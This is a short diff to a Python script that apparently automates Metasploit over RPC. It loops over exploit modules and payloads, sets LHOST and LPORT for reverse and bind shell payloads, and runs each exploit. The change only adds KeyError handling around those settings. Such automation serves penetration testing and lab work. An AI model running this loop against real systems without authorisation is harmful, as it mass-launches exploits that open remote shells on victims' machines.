@@ -511,11 +511,16 @@ def main():
               print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
               try:
                   payload_obj = client.modules.use('payload', payload[index1])
-                  is_network_payload = 'reverse' in payload[index1] or 'bind' in payload[index1]
                   if 'reverse' in payload[index1]:
-                      payload_obj['LHOST'] = LHOST
-                  if is_network_payload:
-                      payload_obj['LPORT'] = LPORT
+                      try:
+                          payload_obj['LHOST'] = LHOST
+                      except KeyError:
+                          pass
+                  if 'reverse' in payload[index1] or 'bind' in payload[index1]:
+                      try:
+                          payload_obj['LPORT'] = LPORT
+                      except KeyError:
+                          pass
                   console.run_module_with_output(exploit, payload_obj)
                   print (": Ok")
               except Exception as e:
